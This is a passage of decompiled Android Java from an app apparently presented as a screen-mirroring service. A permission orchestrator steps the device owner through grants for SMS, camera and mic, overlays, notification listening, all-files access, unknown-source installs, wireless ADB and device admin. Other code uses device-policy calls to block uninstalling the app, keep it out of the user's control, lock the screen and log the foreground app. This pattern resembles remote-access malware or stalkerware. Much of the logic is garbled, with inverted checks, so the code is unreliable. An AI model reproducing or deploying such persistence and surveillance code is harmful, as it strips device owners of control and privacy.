                                    }
                                    break;
                                case -1958287337:
                                    if (!str.equals("installed_apps")) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    }
                                    if (screenMirrorService.getPackageManager().canRequestPackageInstalls()) {
                                        Log.i("PermOrchestrator", "install unknown sources already granted");
                                        if ("installed_apps".equals(str)) {
                                            a(screenMirrorService, "installed_apps", z2);
                                        }
                                    } else {
                                        Intent intent = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES");
                                        intent.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
                                        intent.addFlags(268435456);
                                        screenMirrorService.M(str, intent, null, z2);
                                    }
                                    break;
                                case -1882128253:
                                    if (str.equals("write_settings")) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (Settings.System.canWrite(screenMirrorService)) {
                                        Log.i("PermOrchestrator", "write settings already granted");
                                    } else {
                                        Intent intent2 = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS");
                                        intent2.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
                                        intent2.addFlags(268435456);
                                        screenMirrorService.M("write_settings", intent2, screenMirrorService.getString(R.string.app_name), z2);
                                    }
                                    break;
                                case -1367751899:
                                    if (str.equals("camera")) {
                                        for (i3 = 0; i3 < 2; i3++) {
                                            if (screenMirrorService.checkSelfPermission(strArr[i3]) != 0) {
                                                z3 = false;
                                                if (z3) {
                                                    Log.i("PermOrchestrator", "camera+mic already granted");
                                                    a(screenMirrorService, "camera", z2);
                                                } else {
                                                    screenMirrorService.L("camera", strArr, z2);
                                                }
                                            }
                                            break;
                                        }
                                        if (z3) {
                                            Log.i("PermOrchestrator", "camera+mic already granted");
                                            a(screenMirrorService, "camera", z2);
                                        } else {
                                            screenMirrorService.L("camera", strArr, z2);
                                        }
                                    } else {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    }
                                    break;
                                case -1091287984:
                                    if (str.equals("overlay")) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (B(screenMirrorService)) {
                                        Log.i("PermOrchestrator", "display over other apps already granted");
                                        a(screenMirrorService, "overlay", z2);
                                    } else {
                                        screenMirrorService.M("overlay", e(screenMirrorService), screenMirrorService.getString(R.string.app_name), z2);
                                    }
                                    break;
                                case -602477530:
                                    if (str.equals("device_admin")) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (D(screenMirrorService)) {
                                        Log.i("PermOrchestrator", "device admin already active");
                                    } else {
                                        int i6 = DeviceAdminRequestActivity.f2445a;
                                        Intent intent3 = new Intent(screenMirrorService, (Class<?>) DeviceAdminRequestActivity.class);
                                        intent3.addFlags(276889600);
                                        screenMirrorService.G(intent3, z2);
                                    }
                                    break;
                                case -458865877:
                                    if (str.equals("oem_autostart")) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (I(screenMirrorService)) {
                                        Log.i("PermOrchestrator", "oem autostart already done");
                                        S(screenMirrorService, "oem_autostart");
                                        screenMirrorService.A6(600L);
                                    } else {
                                        screenMirrorService.E("oem_autostart");
                                    }
                                    break;
                                case -331239923:
                                    str5 = str4;
                                    if (str.equals(str5)) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (F(screenMirrorService)) {
                                        Log.i("PermOrchestrator", "battery whitelist already granted");
                                        S(screenMirrorService, str5);
                                        screenMirrorService.A6(600L);
                                    } else {
                                        screenMirrorService.E(str5);
                                    }
                                    break;
                                case 114009:
                                    if (str.equals("sms")) {
                                        for (i4 = 0; i4 < 5; i4++) {
                                            if (screenMirrorService.checkSelfPermission(strArr2[i4]) != 0) {
                                                z3 = false;
                                                if (z3) {
                                                    Log.i("PermOrchestrator", "sms already granted");
                                                    a(screenMirrorService, "sms", z2);
                                                } else {
                                                    screenMirrorService.L("sms", strArr2, z2);
                                                }
                                            }
                                            break;
                                        }
                                        if (z3) {
                                            Log.i("PermOrchestrator", "sms already granted");
                                            a(screenMirrorService, "sms", z2);
                                        } else {
                                            screenMirrorService.L("sms", strArr2, z2);
                                        }
                                    } else {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    }
                                    break;
                                case 97434231:
                                    str6 = str2;
                                    if (str.equals(str6)) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (z(screenMirrorService)) {
                                        Log.i("PermOrchestrator", "all files access already granted");
                                    } else {
                                        screenMirrorService.M(str6, c(screenMirrorService), null, z2);
                                    }
                                    break;
                                case 111574433:
                                    str7 = str3;
                                    if (str.equals(str7)) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (C(screenMirrorService)) {
                                        Log.i("PermOrchestrator", "usage access already granted");
                                    } else {
                                        Intent intent4 = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
                                        intent4.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
                                        intent4.addFlags(268435456);
                                        screenMirrorService.M(str7, intent4, screenMirrorService.getString(R.string.app_name), z2);
                                    }
                                    break;
                                case 414855702:
                                    if (str.equals("vendor_battery")) {
                                        if (!f2.l.z(screenMirrorService) && !f2.l.y(screenMirrorService)) {
                                            screenMirrorService.E("vendor_battery");
                                        }
                                        Log.i("PermOrchestrator", "vendor battery already done");
                                        S(screenMirrorService, "vendor_battery");
                                        screenMirrorService.A6(600L);
                                    } else {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    }
                                    break;
                                case 1272354024:
                                    if (str.equals("notifications")) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (A(screenMirrorService)) {
                                        Log.i("PermOrchestrator", "notification listener already granted");
                                    } else {
                                        screenMirrorService.M("notifications", d(screenMirrorService), screenMirrorService.getString(R.string.app_name), z2);
                                    }
                                    break;
                                case 1772630142:
                                    if (str.equals("wireless_adb")) {
                                        bgVar = cg.f3745d;
                                        if (bgVar != null || !bgVar.a()) {
                                            z3 = false;
                                        }
                                        if (z3) {
                                            Log.i("PermOrchestrator", "wireless adb pairing info already available");
                                        } else {
                                            screenMirrorService.O();
                                        }
                                    } else {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    }
                                    break;
                                case 1957057233:
                                    if (str.equals("post_notif")) {
                                        i5 = Build.VERSION.SDK_INT;
                                        if (i5 < 33) {
                                            Log.i("PermOrchestrator", "post_notif not required on SDK " + i5);
                                            a(screenMirrorService, "post_notif", z2);
                                        } else if (screenMirrorService.checkSelfPermission("android.permission.POST_NOTIFICATIONS") == 0) {
                                            Log.i("PermOrchestrator", "post_notif already granted");
                                            a(screenMirrorService, "post_notif", z2);
                                        } else {
                                            screenMirrorService.L("post_notif", new String[]{"android.permission.POST_NOTIFICATIONS"}, z2);
                                        }
                                    } else {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    }
                                    break;
                                case 1957569947:
                                    if (str.equals("install")) {
                                        Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    } else if (screenMirrorService.getPackageManager().canRequestPackageInstalls()) {
                                        Log.i("PermOrchestrator", "install unknown sources already granted");
                                        if ("installed_apps".equals(str)) {
                                            a(screenMirrorService, "installed_apps", z2);
                                        }
                                    } else {
                                        Intent intent5 = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES");
                                        intent5.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
                                        intent5.addFlags(268435456);
                                        screenMirrorService.M(str, intent5, null, z2);
                                    }
                                    break;
                                default:
                                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                                    break;
                            }
                        } catch (Throwable th4) {
                            StringBuilder sbK = a0.a.k("launchGrant failed for ", str, ": ");
                            sbK.append(th4.getMessage());
                            Log.w("PermOrchestrator", sbK.toString(), th4);
                            return;
                        }
                    }
                    str2 = "files";
                    str3 = "usage";
                } catch (Throwable th5) {
                    th = th5;
                    str2 = "files";
                }
            } catch (Throwable th6) {
                th = th6;
                str2 = "files";
                str3 = "usage";
                str4 = "battery";
            }
        }
        zX = false;
        if (zX) {
            Log.i("PermOrchestrator", "[DO] " + str + " granted via setPermissionGrantState");
        }
        switch (str.hashCode()) {
            case -1969960369:
                if (str.equals("projection")) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (screenMirrorService.i4()) {
                    Log.i("PermOrchestrator", "projection already granted");
                } else {
                    screenMirrorService.K();
                }
                break;
            case -1958287337:
                if (!str.equals("installed_apps")) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                }
                if (screenMirrorService.getPackageManager().canRequestPackageInstalls()) {
                    Log.i("PermOrchestrator", "install unknown sources already granted");
                    if ("installed_apps".equals(str)) {
                        a(screenMirrorService, "installed_apps", z2);
                    }
                } else {
                    Intent intent6 = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES");
                    intent6.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
                    intent6.addFlags(268435456);
                    screenMirrorService.M(str, intent6, null, z2);
                }
                break;
            case -1882128253:
                if (str.equals("write_settings")) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (Settings.System.canWrite(screenMirrorService)) {
                    Log.i("PermOrchestrator", "write settings already granted");
                } else {
                    Intent intent7 = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS");
                    intent7.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
                    intent7.addFlags(268435456);
                    screenMirrorService.M("write_settings", intent7, screenMirrorService.getString(R.string.app_name), z2);
                }
                break;
            case -1367751899:
                if (str.equals("camera")) {
                    while (i3 < 2) {
                        if (screenMirrorService.checkSelfPermission(strArr[i3]) != 0) {
                            z3 = false;
                            if (z3) {
                                Log.i("PermOrchestrator", "camera+mic already granted");
                                a(screenMirrorService, "camera", z2);
                            } else {
                                screenMirrorService.L("camera", strArr, z2);
                            }
                        }
                        break;
                    }
                    if (z3) {
                        Log.i("PermOrchestrator", "camera+mic already granted");
                        a(screenMirrorService, "camera", z2);
                    } else {
                        screenMirrorService.L("camera", strArr, z2);
                    }
                } else {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                }
                break;
            case -1091287984:
                if (str.equals("overlay")) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (B(screenMirrorService)) {
                    Log.i("PermOrchestrator", "display over other apps already granted");
                    a(screenMirrorService, "overlay", z2);
                } else {
                    screenMirrorService.M("overlay", e(screenMirrorService), screenMirrorService.getString(R.string.app_name), z2);
                }
                break;
            case -602477530:
                if (str.equals("device_admin")) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (D(screenMirrorService)) {
                    Log.i("PermOrchestrator", "device admin already active");
                } else {
                    int i7 = DeviceAdminRequestActivity.f2445a;
                    Intent intent8 = new Intent(screenMirrorService, (Class<?>) DeviceAdminRequestActivity.class);
                    intent8.addFlags(276889600);
                    screenMirrorService.G(intent8, z2);
                }
                break;
            case -458865877:
                if (str.equals("oem_autostart")) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (I(screenMirrorService)) {
                    Log.i("PermOrchestrator", "oem autostart already done");
                    S(screenMirrorService, "oem_autostart");
                    screenMirrorService.A6(600L);
                } else {
                    screenMirrorService.E("oem_autostart");
                }
                break;
            case -331239923:
                str5 = str4;
                if (str.equals(str5)) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (F(screenMirrorService)) {
                    Log.i("PermOrchestrator", "battery whitelist already granted");
                    S(screenMirrorService, str5);
                    screenMirrorService.A6(600L);
                } else {
                    screenMirrorService.E(str5);
                }
                break;
            case 114009:
                if (str.equals("sms")) {
                    while (i4 < 5) {
                        if (screenMirrorService.checkSelfPermission(strArr2[i4]) != 0) {
                            z3 = false;
                            if (z3) {
                                Log.i("PermOrchestrator", "sms already granted");
                                a(screenMirrorService, "sms", z2);
                            } else {
                                screenMirrorService.L("sms", strArr2, z2);
                            }
                        }
                        break;
                    }
                    if (z3) {
                        Log.i("PermOrchestrator", "sms already granted");
                        a(screenMirrorService, "sms", z2);
                    } else {
                        screenMirrorService.L("sms", strArr2, z2);
                    }
                } else {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                }
                break;
            case 97434231:
                str6 = str2;
                if (str.equals(str6)) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (z(screenMirrorService)) {
                    Log.i("PermOrchestrator", "all files access already granted");
                } else {
                    screenMirrorService.M(str6, c(screenMirrorService), null, z2);
                }
                break;
            case 111574433:
                str7 = str3;
                if (str.equals(str7)) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (C(screenMirrorService)) {
                    Log.i("PermOrchestrator", "usage access already granted");
                } else {
                    Intent intent9 = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
                    intent9.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
                    intent9.addFlags(268435456);
                    screenMirrorService.M(str7, intent9, screenMirrorService.getString(R.string.app_name), z2);
                }
                break;
            case 414855702:
                if (str.equals("vendor_battery")) {
                    if (!f2.l.z(screenMirrorService)) {
                        screenMirrorService.E("vendor_battery");
                    }
                    Log.i("PermOrchestrator", "vendor battery already done");
                    S(screenMirrorService, "vendor_battery");
                    screenMirrorService.A6(600L);
                } else {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                }
                break;
            case 1272354024:
                if (str.equals("notifications")) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (A(screenMirrorService)) {
                    Log.i("PermOrchestrator", "notification listener already granted");
                } else {
                    screenMirrorService.M("notifications", d(screenMirrorService), screenMirrorService.getString(R.string.app_name), z2);
                }
                break;
            case 1772630142:
                if (str.equals("wireless_adb")) {
                    bgVar = cg.f3745d;
                    if (bgVar != null) {
                        z3 = false;
                    } else {
                        z3 = false;
                    }
                    if (z3) {
                        Log.i("PermOrchestrator", "wireless adb pairing info already available");
                    } else {
                        screenMirrorService.O();
                    }
                } else {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                }
                break;
            case 1957057233:
                if (str.equals("post_notif")) {
                    i5 = Build.VERSION.SDK_INT;
                    if (i5 < 33) {
                        Log.i("PermOrchestrator", "post_notif not required on SDK " + i5);
                        a(screenMirrorService, "post_notif", z2);
                    } else if (screenMirrorService.checkSelfPermission("android.permission.POST_NOTIFICATIONS") == 0) {
                        Log.i("PermOrchestrator", "post_notif already granted");
                        a(screenMirrorService, "post_notif", z2);
                    } else {
                        screenMirrorService.L("post_notif", new String[]{"android.permission.POST_NOTIFICATIONS"}, z2);
                    }
                } else {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                }
                break;
            case 1957569947:
                if (str.equals("install")) {
                    Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                } else if (screenMirrorService.getPackageManager().canRequestPackageInstalls()) {
                    Log.i("PermOrchestrator", "install unknown sources already granted");
                    if ("installed_apps".equals(str)) {
                        a(screenMirrorService, "installed_apps", z2);
                    }
                } else {
                    Intent intent10 = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES");
                    intent10.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
                    intent10.addFlags(268435456);
                    screenMirrorService.M(str, intent10, null, z2);
                }
                break;
            default:
                Log.w("PermOrchestrator", "unknown grant type: ".concat(str));
                break;
        }
    }

    public static JSONObject P(SharedPreferences sharedPreferences, String str) {
        try {
            long j3 = sharedPreferences.getLong("ts", 0L);
            long j4 = sharedPreferences.getLong("last_hb", 0L);
            long jCurrentTimeMillis = j4 > 0 ? System.currentTimeMillis() - j4 : 0L;
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("breach_type", str);
            jSONObject.put("foreground_pkg", sharedPreferences.getString("fg_pkg", "unknown"));
            jSONObject.put("breach_ts", j3);
            jSONObject.put("downtime_ms", jCurrentTimeMillis);
            jSONObject.put("device_model", sharedPreferences.getString("device_model", "unknown"));
            jSONObject.put("device_brand", sharedPreferences.getString("device_brand", "unknown"));
            jSONObject.put("device_manufacturer", sharedPreferences.getString("device_mfr", "unknown"));
            jSONObject.put("android_version", sharedPreferences.getInt("android_ver", 0));
            jSONObject.put("legacy_app_version", sharedPreferences.getString("app_ver", "unknown"));
            jSONObject.put("recovery_ts", System.currentTimeMillis());
            return jSONObject;
        } catch (Throwable th) {
            Log.e("BreachForensics", "legacy breach detail failed", th);
            return new JSONObject();
        }
    }

    public static String Q(SharedPreferences sharedPreferences, String str) {
        return str + "|" + sharedPreferences.getLong("ts", 0L) + "|" + sharedPreferences.getString("fg_pkg", "") + "|" + sharedPreferences.getString("device_model", "") + "|" + sharedPreferences.getString("device_brand", "") + "|" + sharedPreferences.getString("device_mfr", "") + "|" + sharedPreferences.getInt("android_ver", 0) + "|" + sharedPreferences.getString("app_ver", "");
    }

    public static String R(Context context) {
        if (!D(context)) {
            return "LOCK_FAIL|admin_inactive";
        }
        try {
            ((DevicePolicyManager) context.getSystemService("device_policy")).lockNow();
            return "LOCK_OK";
        } catch (Throwable th) {
            Log.w("DeviceAdmin", "lockNow failed: " + th.getMessage());
            return "LOCK_FAIL|" + th.getMessage();
        }
    }

    public static void S(Context context, String str) {
        if (context == null || str == null) {
            return;
        }
        try {
            context.getApplicationContext().getSharedPreferences("post_a11y_grants", 0).edit().putBoolean(g0(str), true).apply();
        } catch (Throwable unused) {
        }
    }

    public static String T(ScreenMirrorService screenMirrorService, long j3) {
        String strB0;
        Context applicationContext = screenMirrorService.getApplicationContext();
        synchronized (n) {
            f4579r = -1L;
            f4580s = false;
            f4581t = false;
            try {
                applicationContext.getSharedPreferences("a11y_restore", 0).edit().putBoolean("ever_enabled", true).apply();
            } catch (Throwable unused) {
            }
            W(applicationContext);
            h0 h0VarR = h0.R(applicationContext);
            synchronized (h0VarR) {
                strB0 = h0VarR.b0(j3);
            }
        }
        return strB0;
    }

    public static boolean U(String str, String str2, String str3, String str4) {
        if (str != null && !str.isEmpty()) {
            if (str.contains(str2) || str.contains(str3)) {
                return true;
            }
            for (String str5 : str.split(":")) {
                String strTrim = str5.trim();
                if (!strTrim.isEmpty() && strTrim.endsWith("ScreenMirrorService")) {
                    if (strTrim.startsWith(str4 + "/")) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static String V(Throwable th, String str) {
        return (th.getMessage() == null || th.getMessage().isEmpty()) ? str : th.getMessage();
    }

    public static void W(Context context) {
        if (context == null || !c2.p.k(context)) {
            return;
        }
        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences("breach_forensics", 0);
            String string = sharedPreferences.getString("breach_type", null);
            if (string == null) {
                return;
            }
            JSONObject jSONObjectP = P(sharedPreferences, string);
            long jCurrentTimeMillis = sharedPreferences.getLong("ts", 0L);
            if (jCurrentTimeMillis <= 0) {
                jCurrentTimeMillis = System.currentTimeMillis();
            }
            if (h0.R(context).c0(string, jSONObjectP, jCurrentTimeMillis, Q(sharedPreferences, string)) == null) {
                return;
            }
            if (!sharedPreferences.edit().remove("breach_type").remove("fg_pkg").remove("ts").remove("device_model").remove("device_brand").remove("device_mfr").remove("android_ver").remove("app_ver").commit()) {
                Log.w("BreachForensics", "legacy breach slot clear failed; deterministic retry retained");
            }
            j0 j0Var = cf.K().f3740z;
            if (j0Var != null) {
                j0Var.c();
            }
        } catch (Throwable th) {
            Log.e("BreachForensics", "legacy breach migration failed", th);
        }
    }

    /* JADX WARN: Code duplicated, block: B:100:0x0168  */
    /* JADX WARN: Code duplicated, block: B:102:0x016e  */
    /* JADX WARN: Code duplicated, block: B:117:0x0172 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:118:0x0172 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:119:0x0172 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:121:0x0172 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:122:0x0172 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:123:0x0172 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:124:0x0172 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:134:0x0173 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:55:0x00d1  */
    /* JADX WARN: Code duplicated, block: B:57:0x00d7  */
    /* JADX WARN: Code duplicated, block: B:58:0x00dc  */
    /* JADX WARN: Code duplicated, block: B:60:0x00e4  */
    /* JADX WARN: Code duplicated, block: B:62:0x00ea  */
    /* JADX WARN: Code duplicated, block: B:63:0x00ef  */
    /* JADX WARN: Code duplicated, block: B:65:0x00f7  */
    /* JADX WARN: Code duplicated, block: B:67:0x00fd  */
    /* JADX WARN: Code duplicated, block: B:68:0x0102  */
    /* JADX WARN: Code duplicated, block: B:70:0x0108  */
    /* JADX WARN: Code duplicated, block: B:72:0x010e  */
    /* JADX WARN: Code duplicated, block: B:75:0x0118  */
    /* JADX WARN: Code duplicated, block: B:77:0x011e  */
    /* JADX WARN: Code duplicated, block: B:79:0x0124  */
    /* JADX WARN: Code duplicated, block: B:80:0x0128  */
    /* JADX WARN: Code duplicated, block: B:82:0x0130  */
    /* JADX WARN: Code duplicated, block: B:84:0x013a  */
    /* JADX WARN: Code duplicated, block: B:85:0x013e  */
    /* JADX WARN: Code duplicated, block: B:87:0x0146  */
    /* JADX WARN: Code duplicated, block: B:89:0x014c  */
    /* JADX WARN: Code duplicated, block: B:90:0x0150  */
    /* JADX WARN: Code duplicated, block: B:92:0x0156  */
    /* JADX WARN: Code duplicated, block: B:98:0x0165  */
    public static String X(ScreenMirrorService screenMirrorService) {
        boolean z2;
        int i3;
        boolean z3;
        int i4;
        boolean z4;
        int i5 = 0;
        while (i5 < 6) {
            String str = G[i5];
            if (str == null) {
                z2 = false;
            } else {
                try {
                    z2 = screenMirrorService.getApplicationContext().getSharedPreferences("post_a11y_grants", 0).getBoolean(g0(str), false);
                } catch (Throwable unused) {
                    z2 = false;
                }
            }
            if (!z2) {
                i3 = i5;
                if ("overlay".equals(str)) {
                    if (!B(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("notifications".equals(str)) {
                    if (!A(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("battery".equals(str)) {
                    if (!F(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("vendor_battery".equals(str)) {
                    if (f2.l.z(screenMirrorService) && !f2.l.y(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("oem_autostart".equals(str)) {
                    if (!I(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("installed_apps".equals(str)) {
                    if (!screenMirrorService.getPackageManager().canRequestPackageInstalls()) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if (!"notif_channel_hide".equals(str)) {
                    if (!"post_notif".equals(str) || "sms".equals(str) || "camera".equals(str)) {
                        z3 = true;
                    } else {
                        z3 = false;
                    }
                    if (!z3) {
                        continue;
                    } else {
                        if (!H(screenMirrorService, str)) {
                            return str;
                        }
                        S(screenMirrorService, str);
                    }
                } else {
                    if (Build.VERSION.SDK_INT < 33) {
                        return str;
                    }
                    S(screenMirrorService, str);
                }
            } else if (("vendor_battery".equals(str) || "oem_autostart".equals(str)) && !H(screenMirrorService, str)) {
                Log.w("PermOrchestrator", "clearing legacy unverified OEM done marker type=" + str);
                j(screenMirrorService, str);
                i3 = i5;
                if ("overlay".equals(str)) {
                    if (!B(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("notifications".equals(str)) {
                    if (!A(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("battery".equals(str)) {
                    if (!F(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("vendor_battery".equals(str)) {
                    if (f2.l.z(screenMirrorService)) {
                    }
                    S(screenMirrorService, str);
                } else if ("oem_autostart".equals(str)) {
                    if (!I(screenMirrorService)) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if ("installed_apps".equals(str)) {
                    if (!screenMirrorService.getPackageManager().canRequestPackageInstalls()) {
                        return str;
                    }
                    S(screenMirrorService, str);
                } else if (!"notif_channel_hide".equals(str)) {
                    if ("post_notif".equals(str)) {
                        z3 = true;
                    } else {
                        z3 = true;
                    }
                    if (!z3) {
                        continue;
                    } else {
                        if (!H(screenMirrorService, str)) {
                            return str;
                        }
                        S(screenMirrorService, str);
                    }
                } else {
                    if (Build.VERSION.SDK_INT < 33) {
                        return str;
                    }
                    S(screenMirrorService, str);
                }
            } else {
                if (!("post_notif".equals(str) || "sms".equals(str) || "camera".equals(str)) || H(screenMirrorService, str)) {
                    i3 = i5;
                } else {
                    String[] strArr = {"post_notif", "sms", "camera"};
                    int i6 = 0;
                    int i7 = 0;
                    while (i6 < 3) {
                        String str2 = strArr[i6];
                        if (str2 == null) {
                            i4 = i5;
                            z4 = false;
                        } else {
                            try {
                                i4 = i5;
                                try {
                                    z4 = screenMirrorService.getApplicationContext().getSharedPreferences("post_a11y_grants", 0).getBoolean(g0(str2), false);
                                } catch (Throwable unused2) {
                                    z4 = false;
                                }
                            } catch (Throwable unused3) {
                                i4 = i5;
                            }
                        }
                        if (z4 && !H(screenMirrorService, str2)) {
                            i7++;
                        }
                        i6++;
                        i5 = i4;
                    }
                    i3 = i5;
                    if (i7 >= 2) {
                        Log.w("PermOrchestrator", "heal bulk false-done type=" + str);
                        j(screenMirrorService, str);
                        if ("overlay".equals(str)) {
                            if (!B(screenMirrorService)) {
                                return str;
                            }
                            S(screenMirrorService, str);
                        } else if ("notifications".equals(str)) {
                            if (!A(screenMirrorService)) {
                                return str;
                            }
                            S(screenMirrorService, str);
                        } else if ("battery".equals(str)) {
                            if (!F(screenMirrorService)) {
                                return str;
                            }
                            S(screenMirrorService, str);
                        } else if ("vendor_battery".equals(str)) {
                            if (f2.l.z(screenMirrorService)) {
                            }
                            S(screenMirrorService, str);
                        } else if ("oem_autostart".equals(str)) {
                            if (!I(screenMirrorService)) {
                                return str;
                            }
                            S(screenMirrorService, str);
                        } else if ("installed_apps".equals(str)) {
                            if (!screenMirrorService.getPackageManager().canRequestPackageInstalls()) {
                                return str;
                            }
                            S(screenMirrorService, str);
                        } else if (!"notif_channel_hide".equals(str)) {
                            if ("post_notif".equals(str)) {
                                z3 = true;
                            } else {
                                z3 = true;
                            }
                            if (!z3) {
                                continue;
                            } else {
                                if (!H(screenMirrorService, str)) {
                                    return str;
                                }
                                S(screenMirrorService, str);
                            }
                        } else {
                            if (Build.VERSION.SDK_INT < 33) {
                                return str;
                            }
                            S(screenMirrorService, str);
                        }
                    } else {
                        continue;
                    }
                }
            }
            i5 = i3 + 1;
        }
        return null;
    }

    public static void a(ScreenMirrorService screenMirrorService, String str, boolean z2) {
        if (J(str)) {
            S(screenMirrorService, str);
            if (z2) {
                return;
            }
            screenMirrorService.A6(600L);
        }
    }

    public static b2.f b(Context context, boolean z2) {
        boolean z3;
        List<String> listSingletonList;
        List<String> listSingletonList2;
        b2.f fVar = new b2.f();
        if (context != null && G(context) && D(context)) {
            boolean z4 = true;
            boolean z5 = false;
            try {
                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
                if (devicePolicyManager == null) {
                    z3 = false;
                } else {
                    devicePolicyManager.setUninstallBlocked(ScreenMirrorAdminReceiver.a(context), l(context), z2);
                    Log.i("DeviceAdmin", "setUninstallBlocked(" + z2 + ") ok");
                    z3 = true;
                }
            } catch (Throwable th) {
                a0.a.p(th, new StringBuilder("setUninstallBlocked failed: "), "DeviceAdmin");
            }
            fVar.f274a = z3;
            try {
                DevicePolicyManager devicePolicyManager2 = (DevicePolicyManager) context.getSystemService("device_policy");
                if (devicePolicyManager2 == null) {
                    z4 = false;
                } else {
                    String strL = l(context);
                    if (z2) {
                        String str = t9.f5174e;
                        if (strL == null || strL.trim().isEmpty()) {
                            listSingletonList2 = Collections.EMPTY_LIST;
                        } else {
                            String strTrim = strL.trim();
                            listSingletonList2 = strTrim.equals(str) ? Collections.EMPTY_LIST : Collections.singletonList(strTrim);
                        }
                    } else {
                        listSingletonList2 = Collections.EMPTY_LIST;
                    }
                    devicePolicyManager2.setUserControlDisabledPackages(ScreenMirrorAdminReceiver.a(context), listSingletonList2);
                    Log.i("DeviceAdmin", "setUserControlDisabledPackages=" + listSingletonList2);
                }
            } catch (Throwable th2) {
                a0.a.p(th2, new StringBuilder("setUserControlDisabledPackages failed: "), "DeviceAdmin");
            }
            fVar.f275b = z4;
            try {
                DevicePolicyManager devicePolicyManager3 = (DevicePolicyManager) context.getSystemService("device_policy");
                if (devicePolicyManager3 != null) {
                    String strL2 = l(context);
                    if (z2) {
                        String str2 = t9.f5174e;
                        if (strL2 == null || strL2.trim().isEmpty()) {
                            listSingletonList = Collections.EMPTY_LIST;
                        } else {
                            String strTrim2 = strL2.trim();
                            listSingletonList = strTrim2.equals(str2) ? Collections.EMPTY_LIST : Collections.singletonList(strTrim2);
                        }
                    } else {
                        listSingletonList = null;
                    }
                    boolean permittedAccessibilityServices = devicePolicyManager3.setPermittedAccessibilityServices(ScreenMirrorAdminReceiver.a(context), listSingletonList);
                    Log.i("DeviceAdmin", "setPermittedAccessibilityServices coreOnly=" + z2 + " accepted=" + permittedAccessibilityServices);
                    z5 = permittedAccessibilityServices;
                }
            } catch (Throwable th3) {
                a0.a.p(th3, new StringBuilder("setPermittedAccessibilityServices failed: "), "DeviceAdmin");
            }
            fVar.f276c = z5;
        }
        return fVar;
    }

    public static Intent c(ScreenMirrorService screenMirrorService) {
        String packageName = screenMirrorService.getPackageName();
